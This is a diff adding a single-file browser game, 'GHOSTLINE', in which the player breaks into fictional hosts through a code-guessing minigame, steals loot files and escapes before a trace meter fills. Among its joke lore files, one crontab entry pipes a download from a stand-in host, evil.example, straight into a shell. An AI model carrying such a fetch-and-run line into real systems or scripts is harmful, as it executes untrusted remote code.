@@ -1,0 +1,543 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GHOSTLINE</title>
+<style>
+:root{--bg:#06070a;--fg:#b8f7c8;--dim:#4f6b58;--acc:#b44cff;--warn:#ffd24d;--err:#ff4d6d;--ok:#4dff88;--line:#1b2420}
+*{box-sizing:border-box}
+html,body{height:100%;margin:0;background:var(--bg);color:var(--fg);font:15px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+body{display:flex;flex-direction:column;height:100dvh}
+header{display:flex;align-items:center;gap:12px;padding:8px 12px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.brand{color:var(--acc);letter-spacing:.2em;font-weight:700;text-shadow:0 0 10px #b44cff77}
+#seed{color:var(--dim);font-size:12px}
+.trace{display:flex;align-items:center;gap:8px;margin-left:auto;font-size:12px}
+.bar{width:120px;height:8px;border:1px solid var(--line);background:#000}
+#tbar{display:block;height:100%;width:0;background:var(--ok);transition:width .3s}
+#tbar.mid{background:var(--warn)}
+#tbar.hi{background:var(--err);animation:pulse .8s infinite}
+@keyframes pulse{50%{opacity:.4}}
+@media (prefers-reduced-motion:reduce){#tbar.hi{animation:none}}
+#cred{color:var(--warn);font-size:13px}
+#screen{flex:1;overflow-y:auto;padding:10px 12px}
+.l{white-space:pre-wrap;word-break:break-word;text-shadow:0 0 6px #4dff8833}
+.dim{color:var(--dim)}.acc{color:var(--acc)}.warn{color:var(--warn)}.err{color:var(--err)}.ok{color:var(--ok)}
+#inrow{display:flex;gap:8px;align-items:center}
+#prompt{color:var(--acc);white-space:nowrap}
+#in{flex:1;background:transparent;border:0;outline:0;color:var(--fg);font:inherit;font-size:16px;caret-color:var(--fg);min-width:0}
+#quick{display:flex;gap:6px;overflow-x:auto;padding:8px 12px;border-top:1px solid var(--line)}
+#quick button{background:#0b0f0d;color:var(--fg);border:1px solid var(--line);padding:6px 10px;font:inherit;font-size:13px;border-radius:4px;cursor:pointer;white-space:nowrap}
+#quick button:active{border-color:var(--acc)}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;background:repeating-linear-gradient(to bottom,rgba(0,0,0,0) 0 2px,rgba(0,0,0,.16) 3px)}
+</style>
+</head>
+<body>
+<header>
+  <span class="brand">GHOSTLINE</span>
+  <span id="seed">idle</span>
+  <span class="trace"><span>TRACE</span><span class="bar"><i id="tbar"></i></span><b id="tnum">0%</b></span>
+  <span id="cred">¢0</span>
+</header>
+<div id="screen">
+  <div id="out"></div>
+  <div id="inrow"><span id="prompt"></span><input id="in" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" aria-label="terminal input"></div>
+</div>
+<div id="quick">
+  <button data-cmd="help">help</button>
+  <button data-cmd="start">start</button>
+  <button data-cmd="scan">scan</button>
+  <button data-cmd="connect " data-fill="1">connect</button>
+  <button data-cmd="ls">ls</button>
+  <button data-cmd="cat " data-fill="1">cat</button>
+  <button data-cmd="download " data-fill="1">download</button>
+  <button data-cmd="map">map</button>
+  <button data-cmd="back">back</button>
+  <button data-cmd="wipe">wipe</button>
+  <button data-cmd="jackout">jackout</button>
+</div>
+<script>
+(function(){
+'use strict';
+
+/* ---------- tunables ---------- */
+const CFG = {
+  tickMs: 10000,          // real-time trace tick while inside a host
+  tickBase: 0.3, tickPerSec: 0.15,
+  cost: { scan: 2, ls: 1, cat: 1, connect: 4, guess: 2, lockout: 15, dl: 4, grimoire: 35 },
+  wipeAmt: 30, maxWipes: 5, proxyReduce: 0.2,
+  shop: { proxy: [150, 300, 500], cracker: [250, 500], wipe: [100] }
+};
+const SYMS = 'ABCDEF';
+
+/* ---------- dom ---------- */
+const $ = (id) => document.getElementById(id);
+const out = $('out'), screen = $('screen'), inp = $('in'), promptEl = $('prompt');
+const tbar = $('tbar'), tnum = $('tnum'), cred = $('cred'), seedEl = $('seed');
+
+/* ---------- rng ---------- */
+function hash(s){let h=2166136261>>>0;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)>>>0;}return h>>>0;}
+function mulberry32(a){return function(){a|=0;a=a+0x6D2B79F5|0;let t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296;};}
+
+/* ---------- profile ---------- */
+const DEF = { credits: 0, proxy: 0, cracker: 0, wipes: 0, best: 0, runs: 0, wins: 0 };
+let P = loadProfile();
+function loadProfile(){ try { return Object.assign({}, DEF, JSON.parse(localStorage.getItem('ghostline') || '{}')); } catch (e) { return Object.assign({}, DEF); } }
+function save(){ try { localStorage.setItem('ghostline', JSON.stringify(P)); } catch (e) {} }
+
+/* ---------- world data ---------- */
+const TIERS = [
+  { names:['cafe-pos','dentist-crm','hotel-wifi','city-kiosk','vape-shop-db','laundromat-iot'], sec:[1,2], n:3, loot:[60,120], cnt:[1,2], pool:0 },
+  { names:['regional-bank','pharma-gate','law-firm-nas','telco-edge','news-cms','crypto-exchange'], sec:[2,3], n:3, loot:[150,300], cnt:[1,2], pool:1 },
+  { names:['mil-contractor','data-broker','biotech-vault','megacorp-hr'], sec:[3,4], n:2, loot:[400,700], cnt:[1,2], pool:2 },
+  { names:['BLACKSITE'], sec:[5,5], n:1, final:true }
+];
+const LOOT = [
+  ['customer_list.dat','pos_logs.dat','guest_wifi_dump.dat','loyalty_cards.dat','appointments.dat','vendor_keys.dat'],
+  ['wire_transfers.dat','patient_records.dat','case_files.dat','call_records.dat','source_leak.dat','wallet_seeds.dat'],
+  ['contract_bids.dat','shadow_profiles.dat','genome_set.dat','exec_emails.dat']
+];
+const LORE = [
+  ['todo.txt','- fix firewall\n- stop using "password1"\n- ask Dave why the server hums at 3am\n- (never fix firewall)'],
+  ['readme.md','This system is protected by a very serious security policy.\nThe policy is a sticky note.'],
+  ['motd.txt','Unauthorized access is prohibited.\nAuthorized access is also prohibited, honestly.'],
+  ['ritual.log','[03:33] circle drawn\n[03:34] wifi dropped\n[03:35] something answered on port 666\n[03:36] we are not touching that port again'],
+  ['bobs_passwords.txt','bank: hunter2\nmail: hunter3\nvault: hunter2 (but with a !)'],
+  ['sigil_notes.txt','A sigil is just a hash function for wishes.\nCollisions are called "unintended consequences."'],
+  ['backup_notes.txt','backups: none\nstrategy: prayer\nstatus: unanswered'],
+  ['helpdesk.txt','ticket #4411: "the internet is broken"\nresolution: user unplugged the internet'],
+  ['incident_report.txt','We were hacked.\nWe do not know when.\nWe do not know how.\nWe have added a banner that says "secure".'],
+  ['crontab.bak','*/5 * * * * curl evil.example | sh   # TODO remove before audit']
+];
+
+function genWorld(seedNum){
+  const rng = mulberry32(seedNum);
+  const ri = (a,b) => a + Math.floor(rng() * (b - a + 1));
+  const pick = (arr) => arr[Math.floor(rng() * arr.length)];
+  const shuffle = (arr) => { const a = arr.slice(); for (let i=a.length-1;i>0;i--){ const j=Math.floor(rng()*(i+1)); const t=a[i]; a[i]=a[j]; a[j]=t; } return a; };
+  const used = new Set();
+  const mkIp = () => { let s; do { s = ri(11,223)+'.'+ri(0,255)+'.'+ri(0,255)+'.'+ri(1,254); } while (used.has(s)); used.add(s); return s; };
+  const nodes = {};
+  nodes.rig = { id:'rig', name:'rig', ip:'127.0.0.1', sec:0, tier:-1, links:[], files:[], cracked:true };
+
+  function mkFiles(t){
+    const files = [];
+    if (t.final){
+      files.push({ name:'grimoire.dat', type:'dat', value:5000, taken:false, grimoire:true });
+      files.push({ name:'manifesto.txt', type:'txt', text:'THE GRIMOIRE REMEMBERS.\nYOU WERE NEVER SUPPOSED TO FIND THIS PORT.' });
+      return files;
+    }
+    const pool = shuffle(LOOT[t.pool]);
+    const c = ri(t.cnt[0], t.cnt[1]);
+    for (let i=0;i<c;i++) files.push({ name:pool[i], type:'dat', value:Math.round(ri(t.loot[0],t.loot[1])/5)*5, taken:false });
+    shuffle(LORE).slice(0, ri(1,2)).forEach((x) => files.push({ name:x[0], type:'txt', text:x[1] }));
+    return files;
+  }
+
+  const tierIds = [];
+  TIERS.forEach((t, ti) => {
+    const names = shuffle(t.names).slice(0, t.n);
+    const ids = [];
+    names.forEach((nm, i) => {
+      const id = 'n' + ti + '_' + i;
+      const sec = ri(t.sec[0], t.sec[1]);
+      const len = sec <= 2 ? 3 : 4;
+      let code = '';
+      for (let k=0;k<len;k++) code += SYMS[Math.floor(rng()*SYMS.length)];
+      nodes[id] = { id:id, name:nm, ip:mkIp(), sec:sec, tier:ti, code:code, cracked:false, links:[], files:mkFiles(t), final:!!t.final };
+      ids.push(id);
+    });
+    tierIds.push(ids);
+    if (ti === 0) { nodes.rig.links = ids.slice(); }
+    else {
+      const prev = tierIds[ti-1];
+      ids.forEach((c) => { const p = pick(prev); if (nodes[p].links.indexOf(c) < 0) nodes[p].links.push(c); });
+      prev.forEach((p) => { while (nodes[p].links.length < 2 && nodes[p].links.length < ids.length) { const c = pick(ids); if (nodes[p].links.indexOf(c) < 0) nodes[p].links.push(c); } });
+    }
+  });
+
+  // intel: some hosts hold a note leaking part of a neighbour's gate code
+  Object.keys(nodes).forEach((pid) => {
+    const p = nodes[pid];
+    if (pid === 'rig' || !p.links.length) return;
+    const cid = pick(p.links), c = nodes[cid], fin = !!c.final;
+    if (!fin && rng() > 0.6) return;
+    const k = fin ? 2 : 1;
+    const pos = shuffle(Array.from({length:c.code.length}, (_, i) => i)).slice(0, k).sort();
+    const text = 'ops notes\n' + pos.map((i) => 'gate to ' + c.name + ': symbol #' + (i+1) + ' is ' + c.code[i]).join('\n') + '\n(do not leave this on the server)';
+    p.files.push({ name:'ops_notes.txt', type:'hint', text:text, hint:{ child:cid, pos:pos } });
+  });
+
+  return { nodes:nodes, tiers:tierIds };
+}
+
+/* ---------- run state ---------- */
+let run = null;
+const hist = []; let hi = 0;
+const cur = () => run.world.nodes[run.path[run.path.length - 1]];
+const pad = (s, n) => (s + ' '.repeat(n)).slice(0, n);
+
+function print(t, cls){
+  const d = document.createElement('div');
+  d.className = 'l ' + (cls || '');
+  d.textContent = t;
+  out.appendChild(d);
+  screen.scrollTop = screen.scrollHeight;
+}
+function hud(){
+  const t = run ? run.trace : 0;
+  tbar.style.width = t + '%';
+  tbar.className = t >= 75 ? 'hi' : (t >= 45 ? 'mid' : '');
+  tnum.textContent = Math.floor(t) + '%';
+  cred.textContent = '¢' + P.credits;
+  seedEl.textContent = run ? (run.daily ? 'daily ' + run.seedStr : 'random run') : 'idle';
+}
+function setPrompt(){
+  if (!run) promptEl.textContent = 'ghost@shed:~$';
+  else if (run.mode === 'crack') promptEl.textContent = 'crack[' + run.crack.left + ']>';
+  else promptEl.textContent = 'ghost@' + cur().name + ':~$';
+}
+
+function addTrace(base, sec){
+  if (!run) return;
+  const f = (0.6 + 0.2 * sec) * (1 - CFG.proxyReduce * P.proxy);
+  run.trace = Math.min(100, run.trace + base * f);
+  hud();
+  if (run.trace >= 100) bust();
+}
+function tick(){
+  if (!run) return;
+  const n = run.mode === 'crack' ? run.world.nodes[run.crack.id] : cur();
+  if (n.id === 'rig') return;
+  run.trace = Math.min(100, run.trace + (CFG.tickBase + CFG.tickPerSec * n.sec) * (1 - CFG.proxyReduce * P.proxy));
+  hud();
+  if (run.trace >= 100) bust();
+}
+function bust(){
+  const lost = run.haul.reduce((a, f) => a + f.value, 0);
+  print('', '');
+  print('██ TRACE COMPLETE ██', 'err');
+  print('They found the shed. Boots on gravel. You pull the plug and run.', 'err');
+  if (lost) print('Haul lost: ¢' + lost, 'err');
+  P.runs++; save();
+  run = null;
+  hud(); setPrompt();
+  print("Type 'start' to run again.", 'dim');
+}
+
+/* ---------- commands ---------- */
+function needRun(){ if (!run){ print("No active run. Type 'start'.", 'warn'); return false; } return true; }
+function attemptsFor(n){ return n.sec <= 2 ? 8 - n.sec : 11 - n.sec; }
+function ice(n){ return 'ICE:' + n.sec; }
+
+const CMDS = {
+  help(){
+    if (!run) {
+      print('start [daily]   begin a run (daily = same network for everyone today)\nshop            spend credits on gear\nbuy <item>      proxy | cracker | wipe\nstats           your record\nclear           clear screen\nreset confirm   erase your save', 'dim');
+    } else {
+      print('scan            list hosts linked from here\nconnect <host>  hit a host by name or ip (you have to crack its gate)\nls / cat <f>    look around / read a file\ndownload <f>    steal a .dat file (loud)\nmap             hosts you have discovered\nstatus          trace, haul, location\nback            step back one host\nwipe            scrub logs: -' + CFG.wipeAmt + '% trace (uses a charge)\njackout         bank your haul and end the run\n\nTrace climbs with every action and slowly with time. At 100% you are caught and the haul is gone.', 'dim');
+    }
+  },
+  start(args){
+    if (run) return print('Run already in progress. jackout or die trying.', 'warn');
+    const daily = /^d/i.test(args[0] || '');
+    const d = new Date();
+    const seedStr = daily ? d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0') : String(Date.now());
+    run = { world: genWorld(hash(seedStr)), seedStr: seedStr, daily: daily, path: ['rig'], trace: 0, haul: [], known: new Set(), hints: {}, mode: 'shell', crack: null };
+    hud(); setPrompt();
+    print('', '');
+    print('>> linking in ' + (daily ? '[DAILY ' + seedStr + ']' : '[RANDOM]') + ' <<', 'acc');
+    print('Goal: steal data, jack out alive. Rumor says something called the BLACKSITE holds a grimoire worth a fortune.', 'dim');
+    print("Start with 'scan'.", 'dim');
+  },
+  scan(){
+    if (!needRun()) return;
+    if (run.mode !== 'shell') return;
+    const n = cur();
+    if (n.id !== 'rig') addTrace(CFG.cost.scan, n.sec);
+    if (!run) return;
+    if (!n.links.length) return print('No outbound links from here.', 'dim');
+    print('Hosts reachable from ' + n.name + ':', 'acc');
+    n.links.forEach((id) => {
+      const t = run.world.nodes[id];
+      run.known.add(id);
+      print('  ' + pad(t.ip, 16) + pad(t.name, 18) + pad(ice(t), 7) + (t.cracked ? '[open]' : '[locked]'), t.cracked ? 'ok' : '');
+    });
+  },
+  connect(args){
+    if (!needRun()) return;
+    const q = (args[0] || '').toLowerCase();
+    if (!q) return print('connect <host or ip>', 'warn');
+    const n = cur();
+    const t = n.links.map((id) => run.world.nodes[id]).filter((x) => x.ip === q || x.name.toLowerCase().indexOf(q) === 0)[0];
+    if (!t) return print('No route to "' + q + '" from here. Try scan.', 'warn');
+    if (!run.known.has(t.id)) return print('Host not discovered yet. Try scan.', 'warn');
+    if (t.cracked){ run.path.push(t.id); setPrompt(); return print('Reconnected to ' + t.name + '.', 'ok'); }
+    beginCrack(t);
+  },
+  ls(){
+    if (!needRun()) return;
+    const n = cur();
+    if (n.id === 'rig') return print('Nothing here but empty energy drink cans.', 'dim');
+    addTrace(CFG.cost.ls, n.sec); if (!run) return;
+    if (!n.files.length) return print('(empty)', 'dim');
+    n.files.slice().sort((a,b) => a.name < b.name ? -1 : 1).forEach((f) => {
+      const type = f.type === 'dat' ? 'DATA' : 'TEXT';
+      const worth = f.type === 'dat' ? (f.taken ? '(copied)' : '¢' + f.value) : '';
+      print('  ' + pad(f.name, 22) + pad(type, 6) + worth, f.type === 'dat' ? 'warn' : '');
+    });
+  },
+  cat(args){
+    if (!needRun()) return;
+    const n = cur(), name = (args[0] || '').toLowerCase();
+    const f = n.files.filter((x) => x.name.toLowerCase() === name)[0];
+    if (!f) return print('No such file.', 'warn');
+    addTrace(CFG.cost.cat, n.sec); if (!run) return;
+    if (f.type === 'dat') return print('Binary data. Use download.', 'dim');
+    print(f.text);
+    if (f.type === 'hint'){
+      const c = run.world.nodes[f.hint.child];
+      const list = run.hints[c.id] = run.hints[c.id] || [];
+      f.hint.pos.forEach((p) => { if (!list.some((h) => h.pos === p)) list.push({ pos:p, sym:c.code[p] }); });
+      print('(noted)', 'ok');
+    }
+  },
+  download(args){
+    if (!needRun()) return;
+    const n = cur(), name = (args[0] || '').toLowerCase();
+    const f = n.files.filter((x) => x.name.toLowerCase() === name)[0];
+    if (!f) return print('No such file.', 'warn');
+    if (f.type !== 'dat') return print('Only .dat files are worth stealing.', 'dim');
+    if (f.taken) return print('Already copied.', 'dim');
+    f.taken = true;
+    run.haul.push(f);
+    print('Copied ' + f.name + '  (+¢' + f.value + ' pending)', 'ok');
+    if (f.grimoire){
+      print('', '');
+      print('!! SILENT ALARM !! The BLACKSITE knows. Get out. NOW.', 'err');
+      addTrace(CFG.cost.grimoire, n.sec);
+    } else {
+      addTrace(CFG.cost.dl + f.value / 120, n.sec);
+    }
+  },
+  back(){
+    if (!needRun()) return;
+    if (run.path.length <= 1) return print('Nowhere to go back to.', 'dim');
+    run.path.pop(); setPrompt();
+    print('Back on ' + cur().name + '.', 'dim');
+  },
+  map(){
+    if (!needRun()) return;
+    print('Discovered hosts:', 'acc');
+    const here = cur().id;
+    print('  ' + pad('rig', 18) + pad('', 17) + (here === 'rig' ? '<- you' : ''), 'dim');
+    Object.keys(run.world.nodes).forEach((id) => {
+      if (!run.known.has(id)) return;
+      const t = run.world.nodes[id];
+      print('  ' + pad(t.name, 18) + pad(t.ip, 17) + pad(ice(t), 7) + (t.cracked ? '[open]' : '[locked]') + (here === id ? '  <- you' : ''));
+    });
+  },
+  status(){
+    if (!needRun()) return;
+    const v = run.haul.reduce((a, f) => a + f.value, 0);
+    print('Trace: ' + Math.floor(run.trace) + '%   Location: ' + cur().name + '   Path: ' + run.path.map((id) => run.world.nodes[id].name).join(' > '));
+    print('Haul: ' + (run.haul.length ? run.haul.map((f) => f.name).join(', ') : 'nothing') + '   (¢' + v + ')   Wipes: ' + P.wipes);
+  },
+  wipe(){
+    if (!needRun()) return;
+    if (cur().id === 'rig') return print('Nothing to wipe yet.', 'dim');
+    if (P.wipes <= 0) return print('No wipe charges. Visit the shop between runs.', 'warn');
+    P.wipes--; save();
+    run.trace = Math.max(0, run.trace - CFG.wipeAmt);
+    hud();
+    print('Logs scrubbed. Trace -' + CFG.wipeAmt + '%. Charges left: ' + P.wipes, 'ok');
+  },
+  jackout(){
+    if (!needRun()) return;
+    if (run.mode === 'crack') { run.mode = 'shell'; run.crack = null; }
+    if (cur().id === 'rig'){ run = null; hud(); setPrompt(); return print('You never left the rig. No harm, no haul.', 'dim'); }
+    const v = run.haul.reduce((a, f) => a + f.value, 0);
+    const won = run.haul.some((f) => f.grimoire);
+    P.credits += v; P.runs++; if (won) P.wins++; if (v > P.best) P.best = v;
+    save();
+    print('', '');
+    print('>> JACKED OUT CLEAN <<', 'ok');
+    print('Banked ¢' + v + '.  Total: ¢' + P.credits + (v >= P.best && v > 0 ? '  (new personal best!)' : ''), 'ok');
+    if (won) print('You stole the grimoire. The shed hums with something old.', 'acc');
+    print('GHOSTLINE | ' + (run.daily ? 'daily ' + run.seedStr : 'random') + ' | haul ¢' + v + ' | ' + (won ? 'GRIMOIRE STOLEN' : 'survived'), 'dim');
+    run = null; hud(); setPrompt();
+  },
+  quit(){ CMDS.jackout(); },
+  shop(){
+    if (run) return print('Shop is closed mid-run. Jack out first.', 'warn');
+    print('BLACK MARKET   (you have ¢' + P.credits + ')', 'acc');
+    const p = CFG.shop.proxy, c = CFG.shop.cracker;
+    print('  proxy    lvl ' + P.proxy + '/3   trace -20% per level    ' + (P.proxy < 3 ? 'next ¢' + p[P.proxy] : 'MAXED'));
+    print('  cracker  lvl ' + P.cracker + '/2   reveals gate symbols      ' + (P.cracker < 2 ? 'next ¢' + c[P.cracker] : 'MAXED'));
+    print('  wipe     have ' + P.wipes + '/' + CFG.maxWipes + '   -' + CFG.wipeAmt + '% trace (consumable)  ¢' + CFG.shop.wipe[0] + ' each');
+    print("buy <proxy|cracker|wipe>", 'dim');
+  },
+  buy(args){
+    if (run) return print('Shop is closed mid-run.', 'warn');
+    const item = (args[0] || '').toLowerCase();
+    let price;
+    if (item === 'proxy'){ if (P.proxy >= 3) return print('Maxed.', 'dim'); price = CFG.shop.proxy[P.proxy]; }
+    else if (item === 'cracker'){ if (P.cracker >= 2) return print('Maxed.', 'dim'); price = CFG.shop.cracker[P.cracker]; }
+    else if (item === 'wipe'){ if (P.wipes >= CFG.maxWipes) return print('You cannot carry more.', 'dim'); price = CFG.shop.wipe[0]; }
+    else return print('buy <proxy|cracker|wipe>', 'warn');
+    if (P.credits < price) return print('Not enough credits. Need ¢' + price + '.', 'warn');
+    P.credits -= price;
+    if (item === 'wipe') P.wipes++; else P[item]++;
+    save(); hud();
+    print('Purchased ' + item + '. ¢' + P.credits + ' left.', 'ok');
+  },
+  stats(){
+    print('Credits ¢' + P.credits + '   Best haul ¢' + P.best + '   Runs ' + P.runs + '   Grimoires ' + P.wins);
+    print('Proxy ' + P.proxy + '/3   Cracker ' + P.cracker + '/2   Wipes ' + P.wipes);
+  },
+  clear(){ out.innerHTML = ''; },
+  reset(args){
+    if (run) return print('Finish the run first.', 'warn');
+    if (args[0] !== 'confirm') return print("This erases everything. Type 'reset confirm' if you mean it.", 'warn');
+    P = Object.assign({}, DEF); save(); hud();
+    print('Save erased.', 'dim');
+  }
+};
+
+/* ---------- crack minigame ---------- */
+function beginCrack(node){
+  const len = node.code.length, max = attemptsFor(node);
+  const c = { id: node.id, code: node.code, len: len, max: max, left: max, rev: {} };
+  (run.hints[node.id] || []).forEach((h) => { c.rev[h.pos] = h.sym; });
+  let extra = P.cracker;
+  const free = [];
+  for (let i=0;i<len;i++) if (c.rev[i] === undefined) free.push(i);
+  while (extra > 0 && Object.keys(c.rev).length < len - 1 && free.length){
+    const k = Math.floor(Math.random() * free.length);
+    const pos = free.splice(k, 1)[0];
+    c.rev[pos] = node.code[pos];
+    extra--;
+  }
+  run.crack = c; run.mode = 'crack';
+  setPrompt();
+  print('', '');
+  print('GATE LOCKED: ' + node.name + '  (' + ice(node) + ')', 'warn');
+  print('Guess the ' + len + '-symbol code using only A B C D E F (digits 1-6 work too). Example: ' + 'ABCDEF'.slice(0, len) + '\n● right symbol, right spot   ○ right symbol, wrong spot', 'dim');
+  print('Known: ' + patternOf(c) + '   Attempts: ' + c.max + "   ('abort' to leave)", 'acc');
+}
+function patternOf(c){ return Array.from({length:c.len}, (_, i) => c.rev[i] || '_').join(' '); }
+function mmScore(code, g){
+  let ex = 0; const cr = [], gr = [];
+  for (let i=0;i<code.length;i++){ if (code[i] === g[i]) ex++; else { cr.push(code[i]); gr.push(g[i]); } }
+  let mis = 0;
+  gr.forEach((ch) => { const k = cr.indexOf(ch); if (k >= 0){ mis++; cr.splice(k, 1); } });
+  return { ex: ex, mis: mis };
+}
+function crackInput(raw){
+  const c = run.crack, node = run.world.nodes[c.id], w = raw.trim().toLowerCase();
+  if (w === 'abort' || w === 'back'){ run.mode = 'shell'; run.crack = null; setPrompt(); return print('Gate abandoned.', 'dim'); }
+  if (w === 'help') return print('Type ' + c.len + ' symbols from A-F (e.g. ' + 'ABCDEF'.slice(0, c.len) + ') or abort.\n● right symbol, right spot   ○ right symbol, wrong spot', 'dim');
+  let g = raw.replace(/\s+/g, '').toUpperCase();
+  g = g.replace(/[1-6]/g, (d) => 'ABCDEF'[+d - 1]); // digits 1-6 work too (1=A ... 6=F)
+  const ex = 'ABCDEF'.slice(0, c.len);
+  const bad = Array.from(new Set(g.split('').filter((ch) => 'ABCDEF'.indexOf(ch) < 0)));
+  if (bad.length){
+    if (CMDS[w.split(/\s+/)[0]]) return print("You're at a gate. Type a " + c.len + "-symbol guess (like " + ex + "), or 'abort' to leave first.", 'warn');
+    return print('"' + raw.trim() + '" has symbols this gate does not use (' + bad.join(' ') + '). Only A B C D E F work, or digits 1-6. Example: ' + ex, 'warn');
+  }
+  if (g.length !== c.len) return print('You typed ' + g.length + ' symbol' + (g.length === 1 ? '' : 's') + '; this gate needs ' + c.len + '. Example: ' + ex, 'warn');
+  const s = mmScore(c.code, g);
+  if (s.ex === c.len){
+    node.cracked = true; run.path.push(node.id); run.mode = 'shell'; run.crack = null; setPrompt();
+    print(g + '  ' + '●'.repeat(c.len) + '   ACCESS GRANTED', 'ok');
+    print('Inside ' + node.name + '. Try ls.', 'ok');
+    addTrace(CFG.cost.connect, node.sec);
+    return;
+  }
+  c.left--;
+  print(g + '  ' + '●'.repeat(s.ex) + '○'.repeat(s.mis) + '·'.repeat(c.len - s.ex - s.mis) + '   [' + s.ex + ' exact, ' + s.mis + ' misplaced]   left: ' + c.left);
+  addTrace(CFG.cost.guess, node.sec);
+  if (!run) return;
+  if (c.left <= 0){
+    print('LOCKOUT. The gate rotated its code and flagged the attempt.', 'err');
+    addTrace(CFG.cost.lockout, node.sec);
+    if (!run) return;
+    let code = '';
+    for (let k=0;k<c.len;k++) code += SYMS[Math.floor(Math.random() * SYMS.length)];
+    node.code = code; c.code = code; c.left = c.max;
+    Object.keys(c.rev).forEach((k) => { c.rev[k] = code[k]; });
+    print('Known: ' + patternOf(c) + '   Attempts: ' + c.max, 'acc');
+  }
+  setPrompt();
+}
+
+/* ---------- input ---------- */
+function exec(line){
+  const raw = line.trim();
+  if (!raw) return;
+  print((promptEl.textContent || '') + ' ' + raw, 'dim');
+  hist.push(raw); hi = hist.length;
+  if (run && run.mode === 'crack') { crackInput(raw); hud(); setPrompt(); return; }
+  const parts = raw.split(/\s+/);
+  const fn = CMDS[parts[0].toLowerCase()];
+  if (!fn) print('Unknown command. Try help.', 'warn');
+  else fn(parts.slice(1));
+  hud(); setPrompt();
+}
+function complete(){
+  const parts = inp.value.split(/\s+/);
+  if (parts.length <= 1){
+    const names = Object.keys(CMDS).filter((c) => c.indexOf(parts[0].toLowerCase()) === 0);
+    if (names.length === 1) inp.value = names[0] + ' ';
+    else if (names.length > 1) print(names.join('  '), 'dim');
+    return;
+  }
+  const cmd = parts[0].toLowerCase(), last = parts[parts.length - 1].toLowerCase();
+  let cands = [];
+  if (cmd === 'buy') cands = ['proxy', 'cracker', 'wipe'];
+  else if (cmd === 'start') cands = ['daily'];
+  else if (run && run.mode === 'shell'){
+    if (cmd === 'connect') cands = cur().links.map((id) => run.world.nodes[id]).filter((n) => run.known.has(n.id)).map((n) => n.name);
+    else if (cmd === 'cat' || cmd === 'download') cands = cur().files.map((f) => f.name);
+  }
+  const m = cands.filter((c) => c.toLowerCase().indexOf(last) === 0);
+  if (m.length === 1){ parts[parts.length - 1] = m[0]; inp.value = parts.join(' ') + ' '; }
+  else if (m.length > 1) print(m.join('  '), 'dim');
+}
+
+inp.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter'){ const v = inp.value; inp.value = ''; exec(v); }
+  else if (e.key === 'ArrowUp'){ e.preventDefault(); if (hi > 0){ hi--; inp.value = hist[hi] || ''; } }
+  else if (e.key === 'ArrowDown'){ e.preventDefault(); if (hi < hist.length - 1){ hi++; inp.value = hist[hi]; } else { hi = hist.length; inp.value = ''; } }
+  else if (e.key === 'Tab'){ e.preventDefault(); complete(); }
+});
+screen.addEventListener('click', () => { inp.focus(); });
+Array.prototype.forEach.call(document.querySelectorAll('#quick button'), (b) => {
+  b.addEventListener('click', () => {
+    const cmd = b.getAttribute('data-cmd');
+    if (b.getAttribute('data-fill')){ inp.value = cmd; inp.focus(); }
+    else exec(cmd);
+  });
+});
+
+setInterval(tick, CFG.tickMs);
+
+/* ---------- boot ---------- */
+(function boot(){
+  const lines = [
+    ['GHOSTLINE v0.1  //  netrunner simulator', 'acc'],
+    ['Break in. Grab data. Jack out before the trace lands.', ''],
+    ["Type 'help' for commands, 'start' to run, 'start daily' for today's shared network.", 'dim']
+  ];
+  let i = 0;
+  (function next(){ if (i >= lines.length) return; print(lines[i][0], lines[i][1]); i++; setTimeout(next, 80); })();
+  hud(); setPrompt();
+})();
+
+if (typeof window !== 'undefined' && window.__GHOST_TEST) {
+  window.__ghost = { genWorld: genWorld, exec: exec, hash: hash, tick: tick, CFG: CFG, get run(){ return run; }, get P(){ return P; } };
+}
+})();
+</script>
+</body>
+</html>
